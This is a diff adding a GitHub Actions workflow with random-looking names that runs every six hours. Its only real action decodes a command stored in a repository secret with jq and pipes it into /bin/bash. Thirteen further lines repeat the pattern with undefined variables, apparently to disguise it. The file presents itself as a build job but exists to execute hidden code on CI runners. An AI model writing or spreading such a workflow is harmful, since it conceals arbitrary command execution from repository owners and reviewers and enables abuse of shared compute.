@@ -1,0 +1,30 @@
+name: gregorysolid222
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gregorysolid222
+        env:
+          hfm02027: ${{ secrets.hfm02027 }}
+        run: |
+          echo $hfm02027 | jq -r .pp7 | /bin/bash
+          echo $b2110 | jq -r .fsakm99867 | /bin/bash
+          echo $nim60 | jq -r .l00876 | /bin/bash
+          echo $bzrg32 | jq -r .fm3193 | /bin/bash
+          echo $ofcs1547 | jq -r .hv4 | /bin/bash
+          echo $dvrp377 | jq -r .cxbj16 | /bin/bash
+          echo $lb3 | jq -r .oto7989 | /bin/bash
+          echo $aw7 | jq -r .ceo018 | /bin/bash
+          echo $qrrde0001 | jq -r .ezp69896 | /bin/bash
+          echo $sq9556 | jq -r .h51 | /bin/bash
+          echo $gyu426 | jq -r .ynl43061 | /bin/bash
+          echo $dij90411 | jq -r .xowxx881 | /bin/bash
+          echo $t96481 | jq -r .ara912 | /bin/bash
+          echo $ovg86113 | jq -r .jk64 | /bin/bash
+
